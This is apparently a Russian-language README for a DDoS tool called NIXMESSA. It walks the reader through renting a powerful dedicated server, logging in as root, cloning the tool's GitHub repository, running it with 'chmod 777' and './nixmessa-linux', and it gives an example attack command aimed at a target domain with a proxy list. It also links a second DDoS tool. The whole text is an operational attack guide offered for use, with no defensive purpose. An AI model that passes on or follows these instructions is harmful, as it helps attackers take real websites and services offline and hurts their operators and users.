# NIXMESSA 


Скачиваете MobaXterm 
Нажимаете User Sessions 
Нажимаете SSH 
Переходите на сайт aeza.net  
Регаетесь, закидываете сотку на баланс 
Покупаете: если нет московского, то парижский, если нет парижского, то германский сервер Dedication, 16 ядер, Ubuntu Linux 
Сервер создался, переходите в MobaXterm 
В окне ввода, где написано IP, вводите IP сервера, из aeza.net 
У вас открывается терминал, вводите "root" 
Далее копируете пароль из aeza.net  
Нажимаете в терминале правой кнопкой мыши  -> Paste -> нажимаете на клавиатуре энтер 
Если у вас ошибка, то снова нажимаете правой кнопкой мыши и Enter 
Когда все получилось, вводите в терминал: 
git clone https://github.com/awuqa/NIXMESSA/
у нас скачивается репозиторий, перекидываем файлы на рабочий стол -> разархировываем их на рабочем столе в папки -> перекидываем файлы из обеих папок (не сами папки, а именно файлы из них) на наш сервер в MobaXterm.
Пишем команды в терминале:
chmod 777 * 
./nixmessa-linux 
далее пример команды для ддоса 
./nixmessa-linux example.com 200 15 proxy.txt 150 




Способ дудоса не в терминале: https://github.com/eshcrow/DeathNetv7.1-DDoSer 

(Папка с DeathNetv7.1-DDoSer будет на рабочем столе) 
